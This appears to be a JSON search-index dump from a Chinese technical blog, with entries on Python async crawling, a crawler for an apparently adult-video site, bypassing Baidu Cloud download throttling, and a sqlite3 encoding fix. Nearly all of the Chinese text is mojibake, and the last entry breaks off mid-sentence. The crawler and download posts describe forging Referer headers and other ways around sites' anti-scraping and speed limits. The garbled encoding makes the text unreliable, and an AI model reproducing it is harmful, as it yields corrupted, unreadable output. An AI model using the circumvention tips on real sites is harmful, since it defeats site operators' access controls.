çš„é“¾æ¥ï¼Œæ­¤æ—¶çš„çˆ¬è™«ç¨‹åºçš„è¿è¡Œåªèƒ½æ˜¯åŒæ­¥çš„ï¼ŒB é¡µé¢åªèƒ½ç­‰åˆ° A é¡µé¢å¤„ç†å®Œæˆä¹‹åæ‰èƒ½æŠ“å–ï¼›ç„¶è€Œå¯¹äºç‹¬ç«‹çš„ä¸¤ä¸ªé¡µé¢ A1 å’Œ A2ï¼Œåœ¨å¤„ç† A1 ç½‘ç»œè¯·æ±‚çš„æ—¶é—´é‡Œï¼Œä¸å…¶è®© CPU ç©ºé—²è€Œ A2 ç­‰åœ¨åé¢ï¼Œä¸å¦‚å…ˆå¤„ç† A2ï¼Œç­‰åˆ°è°å…ˆå®Œæˆç½‘ç»œè¯·æ±‚è°å°±å…ˆæ¥è¿›è¡Œå¤„ç†ï¼Œè¿™æ ·å¯ä»¥æ›´åŠ å……åˆ†åœ°åˆ©ç”¨ CPUï¼Œä½†æ˜¯ A1 å’Œ A2 çš„æ‰§è¡Œé¡ºåºåˆ™æ˜¯ä¸ç¡®å®šçš„ï¼Œä¹Ÿå°±æ˜¯å¼‚æ­¥çš„ã€‚\nä¸ºä»€ä¹ˆè¦ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ï¼Ÿ CPUçš„é€Ÿåº¦è¿œè¿œå¿«äºç£ç›˜ã€ç½‘ç»œç­‰IOã€‚åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ï¼ŒCPUæ‰§è¡Œä»£ç çš„é€Ÿåº¦æå¿«ï¼Œç„¶è€Œï¼Œä¸€æ—¦é‡åˆ°IOæ“ä½œï¼Œå¦‚è¯»å†™æ–‡ä»¶ã€å‘é€ç½‘ç»œæ•°æ®æ—¶ï¼Œå°±éœ€è¦ç­‰å¾…IOæ“ä½œå®Œæˆï¼Œæ‰èƒ½ç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚è¿™ç§æƒ…å†µç§°ä¸ºåŒæ­¥IOã€‚\nåœ¨IOæ“ä½œçš„è¿‡ç¨‹ä¸­ï¼Œå½“å‰çº¿ç¨‹è¢«æŒ‚èµ·ï¼Œè€Œå…¶ä»–éœ€è¦CPUæ‰§è¡Œçš„ä»£ç å°±æ— æ³•è¢«å½“å‰çº¿ç¨‹æ‰§è¡Œäº†ã€‚\nå› ä¸ºä¸€ä¸ªIOæ“ä½œå°±é˜»å¡äº†å½“å‰çº¿ç¨‹ï¼Œå¯¼è‡´å…¶ä»–ä»£ç æ— æ³•æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä½¿ç”¨å¤šçº¿ç¨‹æˆ–è€…å¤šè¿›ç¨‹æ¥å¹¶å‘æ‰§è¡Œä»£ç ï¼Œä¸ºå¤šä¸ªç”¨æˆ·æœåŠ¡ã€‚æ¯ä¸ªç”¨æˆ·éƒ½ä¼šåˆ†é…ä¸€ä¸ªçº¿ç¨‹ï¼Œå¦‚æœé‡åˆ°IOå¯¼è‡´çº¿ç¨‹è¢«æŒ‚èµ·ï¼Œå…¶ä»–ç”¨æˆ·çš„çº¿ç¨‹ä¸å—å½±å“ã€‚\nå¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹çš„æ¨¡å‹è™½ç„¶è§£å†³äº†å¹¶å‘é—®é¢˜ï¼Œä½†æ˜¯ç³»ç»Ÿä¸èƒ½æ— ä¸Šé™åœ°å¢åŠ çº¿ç¨‹ã€‚ç”±äºç³»ç»Ÿåˆ‡æ¢çº¿ç¨‹çš„å¼€é”€ä¹Ÿå¾ˆå¤§ï¼Œæ‰€ä»¥ï¼Œä¸€æ—¦çº¿ç¨‹æ•°é‡è¿‡å¤šï¼ŒCPUçš„æ—¶é—´å°±èŠ±åœ¨çº¿ç¨‹åˆ‡æ¢ä¸Šäº†ï¼ŒçœŸæ­£è¿è¡Œä»£ç çš„æ—¶é—´å°±å°‘äº†ï¼Œç»“æœå¯¼è‡´æ€§èƒ½ä¸¥é‡ä¸‹é™ã€‚\nç”±äºæˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜æ˜¯CPUé«˜é€Ÿæ‰§è¡Œèƒ½åŠ›å’ŒIOè®¾å¤‡çš„é¾Ÿé€Ÿä¸¥é‡ä¸åŒ¹é…ï¼Œå¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹åªæ˜¯è§£å†³è¿™ä¸€é—®é¢˜çš„ä¸€ç§æ–¹æ³•ã€‚\nå¦ä¸€ç§è§£å†³IOé—®é¢˜çš„æ–¹æ³•æ˜¯å¼‚æ­¥IOã€‚å½“ä»£ç éœ€è¦æ‰§è¡Œä¸€ä¸ªè€—æ—¶çš„IOæ“ä½œæ—¶ï¼Œå®ƒåªå‘å‡ºIOæŒ‡ä»¤ï¼Œå¹¶ä¸ç­‰å¾…IOç»“æœï¼Œç„¶åå°±å»æ‰§è¡Œå…¶ä»–ä»£ç äº†ã€‚ä¸€æ®µæ—¶é—´åï¼Œå½“IOè¿”å›ç»“æœæ—¶ï¼Œå†é€šçŸ¥CPUè¿›è¡Œå¤„ç†ã€‚\nå¦‚ä½•åˆ©ç”¨Pythonå®ç°å¼‚æ­¥ æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä»¥ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š\nEvent Loop Coroutine å…¶ä¸­Event Loopåœ¨å‰é¢å·²ç»è§£é‡Šè¿‡ Coroutineæ˜¯åç¨‹ï¼Œå…·ä½“è§£é‡Šå¯ä»¥æŸ¥é˜…åç¨‹\nPython 3.5 ä»¥åæ¨èä½¿ç”¨ async/await å…³é”®è¯æ¥å®šä¹‰åç¨‹ï¼Œå®ƒå…·æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š\né€šè¿‡ await å°†å¯èƒ½é˜»å¡çš„è¡Œä¸ºæŒ‚èµ·ï¼Œç›´åˆ°æœ‰ç»“æœä¹‹åç»§ç»­æ‰§è¡Œï¼ŒEvent loop ä¹Ÿæ˜¯æ®æ­¤æ¥å¯¹å¤šä¸ªåç¨‹çš„æ‰§è¡Œè¿›è¡Œè°ƒåº¦çš„ï¼› åç¨‹å¹¶ä¸åƒä¸€èˆ¬çš„å‡½æ•°ä¸€æ ·ï¼Œé€šè¿‡ coro() è¿›è¡Œè°ƒç”¨å¹¶ä¸ä¼šæ‰§è¡Œå®ƒï¼Œè€Œåªæœ‰å°†å®ƒæ”¾å…¥ Event loop è¿›è¡Œè°ƒåº¦æ‰èƒ½æ‰§è¡Œã€‚ è¿™é‡Œæˆ‘å°±ä»å»–å¤§å“ªé‡Œæ¬è¿ä¸ªå°ä¾‹å­(æœ‰æ”¹åŠ¨)\n1 2 3 4 5 6 7 8 9 10 11 12 import threading import asyncio async def hello(): print(\u0026#39;Hello world! (%s)\u0026#39; % threading.currentThread()) await asyncio.sleep(1) print(\u0026#39;Hello again! (%s)\u0026#39; % threading.currentThread()) loop = asyncio.get_event_loop() tasks = [hello(), hello()] loop.run_until_complete(asyncio.wait(tasks)) loop.close() æ‰§è¡Œç»“æœ\n1 2 3 4 5 Hello world! (\u0026lt;_MainThread(MainThread, started 140735195337472)\u0026gt;) Hello world! (\u0026lt;_MainThread(MainThread, started 140735195337472)\u0026gt;) (æš‚åœçº¦1ç§’) Hello again! (\u0026lt;_MainThread(MainThread, started 140735195337472)\u0026gt;) Hello again! (\u0026lt;_MainThread(MainThread, started 140735195337472)\u0026gt;) å…¶ä¸­sleepæ˜¯æˆ‘ä»¬æ¨¡æ‹Ÿçš„ioç”¨æ—¶ï¼Œæˆ‘ä¹ˆä½ å¯ä»¥ä»è¿™ä¸ªå°ä¾‹å­ä¸­çœ‹å‡ºï¼Œæ‰§è¡Œhello()çš„æ—¶å€™ï¼Œioå¹¶æœªå µå¡ï¼Œè€Œæ˜¯ç»§ç»­å‘ä¸‹æ‰§è¡Œ hello()ä¼šé¦–å…ˆæ‰“å°å‡ºHello world!ï¼Œç„¶åï¼Œç”±äºasyncio.sleep()æ˜¯ä¸€ä¸ªcoroutineï¼Œæ‰€ä»¥çº¿ç¨‹ä¸ä¼šç­‰å¾…asyncio.sleep()ï¼Œè€Œæ˜¯ç›´æ¥ä¸­æ–­å¹¶æ‰§è¡Œä¸‹ä¸€ä¸ªæ¶ˆæ¯å¾ªç¯ã€‚å½“asyncio.sleep()å®Œæˆæ—¶ï¼Œçº¿ç¨‹å°±å¯ä»¥æ¥ç€æ‰§è¡Œä¸‹ä¸€è¡Œè¯­å¥ã€‚\nä¸‹ä¸€ç¯‡æ–‡ç« å°†åœ¨æ­¤åŸºç¡€ä¸Šå®ç°ä¸€ä¸ªç®€æ´ã€æ™®é€‚çš„çˆ¬è™«æ¡†æ¶\n","permalink":"https://www.hacktech.cn/post/python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%80.html","summary":"\u003chr\u003e\n\u003cp\u003eæœ¬æ–‡ä¸»è¦ä»ä¸€ä¸‹å‡ ä¸ªæ–¹é¢è¿›è¡Œè¯´æ˜:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eä»€ä¹ˆæ˜¯\u003ca href=\"http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B\"\u003eå¼‚æ­¥(Asynchronous)ç¼–ç¨‹\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eä¸ºä»€ä¹ˆè¦ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ï¼Ÿ\u003c/li\u003e\n\u003cli\u003eå¦‚ä½•åˆ©ç”¨Pythonå®ç°å¼‚æ­¥\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e","title":"Pythonå¼‚æ­¥çˆ¬è™«çš„å­¦ä¹ (ä¸€)"},{"content":" èµ·å›  æœ‰ä¸ªæœ‹å‹å«æˆ‘å¸®å¿™å†™ä¸ªçˆ¬è™«ï¼Œçˆ¬å–javbus5ä¸Šé¢æ‰€æœ‰çš„è¯¦æƒ…é¡µé“¾æ¥ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰çš„https://www.javbus5.com/SRS-055è¿™ç§é“¾æ¥ï¼Œ æˆ‘ä¸€çœ‹ï¼Œå˜¿å‘€ï¼Œè¿™æ˜¯å¸æœºçš„æ´»å„¿å•Šï¼Œæˆ‘ç»å¯¹ä¸èƒ½è¾±æ²¡æˆ‘è€å¸æœºçš„åå£°ï¼ˆè¢«è´¥åäº†å¯ä¸å¥½ï¼‰ï¼Œäºæ˜¯å¼€å§‹ç€æ‰‹å†™äº†\næ„æ€ çˆ¬è™«è°ƒåº¦å¯åŠ¨ç¨‹åºcrawler.py é¡µé¢ä¸‹è½½ç¨‹åºdownloader.py é¡µé¢è§£æç¨‹åºpageparser.py æ•°æ®åº“å…¥åº“ä¸å»é‡ç®¡ç†ç¨‹åºcontroler.py çˆ¬å–å…¥å£ä¸ºç¬¬ä¸€é¡µï¼Œå½“é¡µé¢ä¸­å­˜åœ¨ä¸‹ä¸€é¡µçš„è¶…é“¾æ¥ç»§ç»­å¾€ä¸‹çˆ¬ï¼Œè¿™æ˜¯ä¸ªæ­»å¾ªç¯ï¼Œè·³å‡ºæ¡ä»¶ä¸ºæ²¡æœ‰äº†ä¸‹ä¸€é¡µçš„é“¾æ¥\nåœ¨æŸä¸€é¡µä¸­è§£æé¡µé¢ï¼Œè¿”å›æ‰€æœ‰çš„è¯¦æƒ…é¡µé“¾æ¥ï¼Œåˆ©ç”¨è¿­ä»£å™¨è¿”å›ï¼Œç„¶ååœ¨ä¸»ç¨‹åºä¸­è°ƒç”¨è§£æç¨‹åºå¯¹é¡µé¢ä¿¡æ¯è¿›è¡Œè§£æå¹¶åŒ…è£…æˆå­—å…¸è¿”å›ï¼Œå…¶ä¸­ç”¨è¯¦æƒ…é¡µç½‘å€ä½œä¸ºæ•°æ®åº“ä¸»é”®ï¼Œå…¶ä»–ä¿¡æ¯ä¾æ¬¡å†™å…¥æ•°æ®åº“\nå½“è¿™ä¸€é¡µæ‰€æœ‰çš„å­é“¾æ¥çˆ¬å–å®Œæˆåï¼Œç»§ç»­çˆ¬å–ä¸‹ä¸€é¡µã€‚\nå°†æ•°æ®å­˜å…¥æ•°æ®åº“ï¼Œç”¨çš„æ˜¯sqllite3,å¤±è´¥çš„ç½‘å€é¡µå­˜å…¥ä¸€ä¸ªfail_url.txtã€‚\nå¯¹äºå¢é‡çˆ¬å–ï¼Œæˆ‘æ˜¯è¿™ä¹ˆåšçš„ï¼Œå½“çˆ¬å–åˆ°ç›¸åŒçš„ç½‘å€æ—¶ç»“æŸç¨‹åºï¼Œè¿™ä¹ˆåšä¹Ÿæœ‰æ¼æ´ï¼Œæ‰ç–å­¦æµ…ï¼Œæˆ‘æ²¡æƒ³åˆ°å¤ªå¥½çš„åŠæ³•ï¼Œå¸Œæœ›æœ‰å¥½åŠæ³•çš„ç»™æˆ‘è¯´ä¸€å£°ï¼ˆå¸ƒéš†è¿‡æ»¤æ­£åœ¨ç ”ç©¶ä¹‹ä¸­ï¼‰ï¼Œå¦‚æœç”¨æ•°æ®åº“æŸ¥è¯¢å»é‡ï¼Œé‚£ä¹ˆåŠ¿å¿…å¯¼è‡´äºŒæ¬¡çˆ¬å–ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œçˆ¬è™«æ›´å¤šçš„æ—¶é—´æ˜¯èŠ±åœ¨ç½‘ç»œç­‰å¾…ä¸Š\né—®é¢˜ åœ¨å†™çˆ¬è™«çš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€äº›é—®é¢˜\nåœ¨å¢™å†…çˆ¬ä¸åŠ¨ï¼Œçˆ¬å–å‡ ä¸ªä¹‹åå°±å¤±è´¥ï¼Œè¿™ä¸ªè§£å†³æ–¹æ¡ˆåªéœ€è¦å…¨å±€ç¿»å¢™çˆ¬å–å°±å¯ä»¥äº†\næœ¬æ¥ä¹‹å‰åŠ äº†å¤šçº¿ç¨‹å¹¶å‘çˆ¬å–ï¼Œä½†æ˜¯å‘ç°çˆ¬å–ä¸€æ®µæ—¶é—´åä¼šå°ipå¯¼è‡´æ•´ä½“æ— æ³•è¿è¡Œï¼Œæœ¬æ¥æƒ³æä¸ªä»£ç†æ± è¿›è¡Œå¹¶å‘ï¼Œç»“æœç½‘ä¸Šå…è´¹çš„ä»£ç†å¤ªæ…¢å¤ªæ…¢ï¼Œæ ¹æœ¬æ‰“ä¸å¼€ç½‘é¡µï¼Œäºæ˜¯å°±æ”¹å›äº†å•çº¿ç¨‹\nå°±æ˜¯æˆ‘çš„é‚£ä¸ªä¸å®Œå–„çš„å¢é‡çˆ¬å–ï¼Œå¯¼è‡´äº†ä½ ä¸€æ¬¡çˆ¬å–å°±éœ€è¦çˆ¬å–å®Œæˆï¼Œä¸ç„¶æ•°æ®åº“é‡Œé¢å­˜åœ¨ä½ ä¹‹å‰çˆ¬åˆ°çš„ï¼Œçˆ¬å–åˆ°ä½ å·²æœ‰çš„ä¼šç›´æ¥åœæ­¢\nå­˜åœ¨åæ‰’ç­–ç•¥ è¯¦æƒ…é¡µä¸­çš„ç£åŠ›é“¾æ¥æ˜¯ajaxåŠ¨æ€åŠ è½½çš„ï¼Œé€šè¿‡åˆ†ææŠ“åŒ…ï¼Œå¯ä»¥åœ¨XHRä¸­æ‰¾åˆ°æ˜¯ä¸€ä¸ªgetè¯·æ±‚ï¼Œè‡³äºå‚æ•°ï¼Œæˆ‘å¼€å§‹ä¸çŸ¥é“æ€ä¹ˆå¾—æ¥çš„ï¼Œåæ¥åœ¨htmlä»£ç ä¸­æ‰¾åˆ°äº†ï¼Œæˆ‘æ”¾å‡ å¼ å›¾å¤§å®¶å°±æ˜ç™½äº† æˆ‘ä»¬é€šè¿‡å¯¹å“åº”å†…å®¹çš„æŸ¥çœ‹å¯ä»¥å‘ç°ç£åŠ›çš„åŠ è½½è®¿é—®äº†ç±»ä¼¼äºè¿™æ ·ä¸€ä¸ªç½‘å€\n1 https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207\u0026amp;lang=zh\u0026amp;img=https://pics.javbus.info/cover/59pc_b.jpg\u0026amp;uc=0\u0026amp;floor=921 é‚£ä¹ˆè¿™äº›getå‚æ•°æ˜¯ä»å“ªé‡Œæ¥å‘¢ï¼Œè¿™å°±æ˜¯é€šè¿‡ç»éªŒä¸åŸºæœ¬åŠŸå»å‘ç°äº†\né€šè¿‡å¯¹htmlæºæ–‡ä»¶çš„æœç´¢ï¼Œæˆ‘ä»¬å³å¯ç›´æ¥å‘ç°ç­”æ¡ˆ é€šè¿‡åˆ†æå‘ç°ï¼Œåé¢çš„flooræ˜¯ä¸ªéšæœºæ•°å‚æ•°ï¼Œä¸€èˆ¬è¿™ç§å‚æ•°å¯ä»¥å»é™¤æ— å½±å“ï¼Œäº‹å®ä¹Ÿæ˜¯è¿™æ ·\næˆ‘åˆ©ç”¨HttpRequestæ¨¡æ‹Ÿå‘åŒ…ï¼Œå¯¹è¿™ä¸ªè¯·æ±‚ç›´æ¥getï¼Œå‘ç°æ‰€æœ‰æ•°æ®éšè— é‚£ä¹ˆè‚¯å®šæ˜¯æœ‰åæ‰’çš„ç­–ç•¥ï¼Œä¼ªé€ è¯·æ±‚å¤´ï¼Œåæ‰’ä¹Ÿå°±é‚£ä¹ˆå‡ ç§ï¼Œé€šè¿‡åˆ†æå‘ç°æ˜¯åŒæºç­–ç•¥ï¼Œå¯¹Refererè¯·æ±‚å¤´ä¼ªé€ æˆæ¥æºç½‘å€å°±å¯ä»¥ç›´æ¥è·å–åˆ°å†…å®¹äº† å¸¸è§çš„Python2.xç¼–ç é—®é¢˜,å…¨éƒ¨è½¬æ¢ä¸ºunicodeå­—èŠ‚æµå°±å¯ä»¥äº† è¿™ä¸ªé—®é¢˜åœ¨æˆ‘åšå®¢ä¸­å·²ç»è®°å½•äº†http://www.53xiaoshuo.com/Python/77.html æœ‰å…´è¶£çš„ç«¥é‹å¯ä»¥çœ‹çœ‹\né‡åˆ°çš„æœ€é—¹å¿ƒé—®é¢˜æ˜¯è¯¦æƒ…é¡µçš„é¡¹ç›®æŠ“å–ï¼Œæœ‰çš„è¯¦æƒ…é¡µçš„ç±»åˆ«ä¸åŒï¼Œæˆ‘å¼€å§‹åªåˆ†æäº†ä¸€ä¸ªé¡µé¢ï¼Œå¯¼è‡´å†™çš„è§„åˆ™åœ¨æœ‰çš„é¡µé¢ä¸Šé¢‘é¢‘å‡ºé”™ å¯¼è‡´åé¢å¯¹æŠ“å–è§„åˆ™è¿›è¡Œäº†å¤§æ”¹,é‡å†™äº†åˆ†æè§„åˆ™ï¼Œç”¨äº†ä¸ªç¬¨åŠæ³•ï¼Œæ¯•ç«Ÿé‚£å°å—çš„htmlå†™çš„ååˆ†ä¸è§„èŒƒï¼Œæ­£åˆ™è§„åˆ™æœ‰ä¸‰ç§ï¼ŒæŒºçƒ¦äºº æ¯”å¦‚ä¸Šå›¾çš„ä¸¤ä¸ªå°±ä¸åŒï¼Œhtmlä»£ç æ›´æ˜¯ç¨€çƒ‚ï¼Œéœ€è¦åˆ¤æ–­æœ‰æ²¡æœ‰è¿™ä¸ªé¡¹ï¼Œæ²¡æœ‰å°±è®¾ç½®ç©ºå­—èŠ‚å…¥åº“\nåœ¨è¿™å…¶ä¸­çº ç»“äº†ä¸€ä¸ªé—®é¢˜ å°±æ˜¯å¯¹äºè¿™ä¸¤ç§çš„æ¯”è¾ƒï¼Œæˆ‘æƒ³ä¸Šé¢è¿™ç§å˜æˆä¸‹é¢è¿™ç§ï¼Œæ¯•ç«Ÿç¬¬ä¸€ç§çš„è¯ï¼Œsoup.findè¦æ‰§è¡Œä¸¤æ¬¡ï¼Œä½†æ˜¯ä¸‹é¢è¿™ç§åˆè¦æ¯”ä¸Šé¢é‚£ä¸ªå¤šä¸€è¡Œï¼Œä¸‘ä¸€ç‚¹ æœ€åæˆ‘é€‰æ‹©äº†ç¬¬äºŒç§ï¼Œæ‰€æœ‰çš„ä¿¡æ¯åˆ†æä»£ç å°±ä¸è´´äº†ï¼Œå…·ä½“æƒ³çœ‹çš„ç›´æ¥çœ‹æˆ‘çš„ä»£ç æ–‡ä»¶å°±å¥½äº†\nå°Tips å¯¹äºåŠ¨æ€åŠ è½½çš„å†…å®¹çš„çˆ¬å–ï¼Œèƒ½ä¸ç”¨seleniumå»æ¨¡æ‹Ÿæµè§ˆå™¨çˆ¬å–å°±ä¸ç”¨ï¼Œè€—è´¹èµ„æºï¼Œæ›´å¥½çš„æ˜¯è‡ªå·±åˆ†æç½‘ç»œè¯·æ±‚ï¼Œç„¶åæ„é€ \nå¯¹äºé¡µé¢ä¿¡æ¯çš„è§£æï¼Œè¦å¤šçœ‹å‡ ä¸ªé¡µé¢ï¼Œçœ‹æ˜¯å¦ç›¸åŒï¼Œåˆ«åˆ°æ—¶å€™åšå¤šäº‹æƒ…\nå¤šçœ‹åˆ«äººçš„åšå®¢å­¦ä¹ æ€è·¯\næ³¨æ„ çˆ¬è™«ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æœ‰Requestsï¼ŒBeautifulSoupï¼Œä½¿ç”¨å‰è¯·å…ˆpip installè¿™ä¸¤ä¸ªç¬¬ä¸‰æ–¹åº“\næµ‹è¯•å±•ä¸åœ°å€ ä»£ç åœ°å€: coding.net javbus_crawler github.com javbus_crawler å¸æœºçš„åå£°æ€»ç®—æ˜¯æ²¡æœ‰è¾±æ²¡ï¼Œç§‹åå±±ä¾æ—§ï¼Œå˜¿å˜¿\nè½¬è½½è¯·æ³¨æ˜æ¥æºä½œè€…\nåšå®¢ï¼šwww.hacktech.cn ä½œè€…ï¼šAkkuman ","permalink":"https://www.hacktech.cn/post/javbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89.html","summary":"\u003chr\u003e\n\u003ch1 id=\"èµ·å› \"\u003eèµ·å› \u003c/h1\u003e\n\u003chr\u003e\n\u003cp\u003eæœ‰ä¸ªæœ‹å‹å«æˆ‘å¸®å¿™å†™ä¸ªçˆ¬è™«ï¼Œçˆ¬å–javbus5ä¸Šé¢æ‰€æœ‰çš„è¯¦æƒ…é¡µé“¾æ¥ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰çš„https://www.javbus5.com/SRS-055è¿™ç§é“¾æ¥ï¼Œ\næˆ‘ä¸€çœ‹ï¼Œå˜¿å‘€ï¼Œè¿™æ˜¯å¸æœºçš„æ´»å„¿å•Šï¼Œæˆ‘ç»å¯¹ä¸èƒ½è¾±æ²¡æˆ‘è€å¸æœºçš„åå£°ï¼ˆè¢«è´¥åäº†å¯ä¸å¥½ï¼‰ï¼Œäºæ˜¯å¼€å§‹ç€æ‰‹å†™äº†\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"æ„æ€\"\u003eæ„æ€\u003c/h1\u003e\n\u003chr\u003e\n\u003cul\u003e\n\u003cli\u003eçˆ¬è™«è°ƒåº¦å¯åŠ¨ç¨‹åºcrawler.py\u003c/li\u003e\n\u003cli\u003eé¡µé¢ä¸‹è½½ç¨‹åºdownloader.py\u003c/li\u003e\n\u003cli\u003eé¡µé¢è§£æç¨‹åºpageparser.py\u003c/li\u003e\n\u003cli\u003eæ•°æ®åº“å…¥åº“ä¸å»é‡ç®¡ç†ç¨‹åºcontroler.py\u003c/li\u003e\n\u003c/ul\u003e","title":"javbusçˆ¬è™«-è€å¸æœºä½ å€¼å¾—æ‹¥æœ‰"},{"content":"ç™¾åº¦äº‘é™é€Ÿæ¯”è¾ƒå‘ï¼Œç°åœ¨åŸºæœ¬200kå·¦å³ å¾ˆå¤šäººéƒ½çŸ¥é“äº†ï¼Œä½†æ˜¯æ€»æœ‰æœ‹å‹é—®æˆ‘ï¼Œæˆ‘è¯´æ˜ä¸€ä¸‹\né¦–å…ˆä¸‹è½½IDM(æœ€å¥½æ”¯æŒæ­£ç‰ˆ) ä¸‹è½½é“¾æ¥ï¼š ç™¾åº¦äº‘shaoit\nå¼€å§‹ä¸‹è½½ï¼š ä¸€èˆ¬çš„è¯ï¼Œå°æ–‡ä»¶ç›´æ¥æ‰“å¼€æµè§ˆå™¨å°±å¯ä»¥ä¸‹è½½\nå¤§æ–‡ä»¶ä¸‹è½½ï¼š é¦–å…ˆåœ¨chromeæµè§ˆå™¨ä¸­è£…ä¸Šä¸€ä¸ªUser-Agent Switcher for (Google)Chromeæ’ä»¶,ç„¶åé€‰æ‹©å®‰å“æ‰‹æœºï¼Œä¹Ÿå°±æ˜¯æ‰“å¼€è¿™ä¸ªçš„æ‰‹æœºé¡µé¢ï¼Œç„¶åç›´æ¥ç”¨IDMä¸‹è½½\næ‰¹é‡ä¸‹è½½ä¸å¤–é“¾è·å– ä½¿ç”¨è¿™ä¸ªè„šæœ¬ï¼Œå…·ä½“çœ‹é“¾æ¥å†…ä»‹ç»\nhttps://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B\nå¦‚ä½•å®‰è£…ç”¨æˆ·è„šæœ¬ Firefox åŠç›¸å…³çš„æµè§ˆå™¨ï¼šGreasemonkeyã€‚ Google Chromeã€Chromium åŠç›¸å…³çš„æµè§ˆå™¨ï¼šTampermonkeyã€‚ Opera (ç‰ˆæœ¬ 15 åŠæ›´æ™š)ï¼šTampermonkey æˆ–è€… Violentmonkeyã€‚ Opera ç‰ˆæœ¬ 12 åŠæ›´æ—©åŸç”Ÿæ”¯æŒç”¨æˆ·è„šæœ¬ã€‚ä½† Violentmonkey èƒ½æä¾›æ›´å‹å¥½çš„ç•Œé¢å’Œæ›´å¥½çš„å…¼å®¹æ€§ã€‚ ","permalink":"https://www.hacktech.cn/post/%E7%AA%81%E7%A0%B4%E7%99%BE%E5%BA%A6%E4%BA%91%E9%99%90%E9%80%9F%E4%B8%8E%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD.html","summary":"\u003cp\u003e\u003cstrong\u003eç™¾åº¦äº‘é™é€Ÿæ¯”è¾ƒå‘ï¼Œç°åœ¨åŸºæœ¬200kå·¦å³\u003c/strong\u003e\n\u003cstrong\u003eå¾ˆå¤šäººéƒ½çŸ¥é“äº†ï¼Œä½†æ˜¯æ€»æœ‰æœ‹å‹é—®æˆ‘ï¼Œæˆ‘è¯´æ˜ä¸€ä¸‹\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"é¦–å…ˆä¸‹è½½idmæœ€å¥½æ”¯æŒæ­£ç‰ˆ\"\u003eé¦–å…ˆä¸‹è½½IDM(æœ€å¥½æ”¯æŒæ­£ç‰ˆ)\u003c/h1\u003e\n\u003cp\u003eä¸‹è½½é“¾æ¥ï¼š\n\u003ca href=\"https://eyun.baidu.com/s/3nvg3jdf\"\u003eç™¾åº¦äº‘shaoit\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"å¼€å§‹ä¸‹è½½\"\u003eå¼€å§‹ä¸‹è½½ï¼š\u003c/h1\u003e\n\u003cp\u003eä¸€èˆ¬çš„è¯ï¼Œå°æ–‡ä»¶ç›´æ¥æ‰“å¼€æµè§ˆå™¨å°±å¯ä»¥ä¸‹è½½\u003c/p\u003e\n\u003ch1 id=\"å¤§æ–‡ä»¶ä¸‹è½½\"\u003eå¤§æ–‡ä»¶ä¸‹è½½ï¼š\u003c/h1\u003e\n\u003cp\u003eé¦–å…ˆåœ¨chromeæµè§ˆå™¨ä¸­è£…ä¸Šä¸€ä¸ªUser-Agent Switcher for (Google)Chromeæ’ä»¶,ç„¶åé€‰æ‹©å®‰å“æ‰‹æœºï¼Œä¹Ÿå°±æ˜¯æ‰“å¼€è¿™ä¸ªçš„æ‰‹æœºé¡µé¢ï¼Œç„¶åç›´æ¥ç”¨IDMä¸‹è½½\u003c/p\u003e\n\u003ch1 id=\"æ‰¹é‡ä¸‹è½½ä¸å¤–é“¾è·å–\"\u003eæ‰¹é‡ä¸‹è½½ä¸å¤–é“¾è·å–\u003c/h1\u003e\n\u003cp\u003eä½¿ç”¨è¿™ä¸ªè„šæœ¬ï¼Œå…·ä½“çœ‹é“¾æ¥å†…ä»‹ç»\u003c/p\u003e","title":"çªç ´ç™¾åº¦äº‘é™é€Ÿä¸ç½‘é¡µé™åˆ¶æ‰¹é‡ä¸‹è½½"},{"content":"é—®é¢˜å‡ºç°ï¼š You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.\näº§ç”ŸåŸå› ï¼š é—®é¢˜åœ¨ç”¨Pythonçš„sqlite3æ“ä½œæ•°æ®åº“è¦æ’å…¥çš„å­—ç¬¦ä¸²ä¸­å«æœ‰éasciiå­—ç¬¦æ—¶äº§ç”Ÿï¼Œåšæ’å…¥çš„æ—¶å€™å°±æŠ¥å½“å‰è¿™ä¸ªé”™è¯¯ã€‚\nè§£å†³æ–¹æ³•ï¼š 1. æŒ‰æç¤º 1 2 connection = sqlite3.connect(...) connection.text_factory = str ä½†æ˜¯å¦‚æœå­—ç¬¦ä¸­å‡ºç°éasciiå­—ç¬¦ï¼Œé‚£ä¹ˆä¾ç„¶ä¸èƒ½è§£å†³é—®é¢˜ï¼Œä¼šäº§ç”Ÿä¸å¯é¢„çŸ¥çš„ä¹±ç ï¼Œè¿™æ ·å¯ä»¥å‚è€ƒ 2\n2. 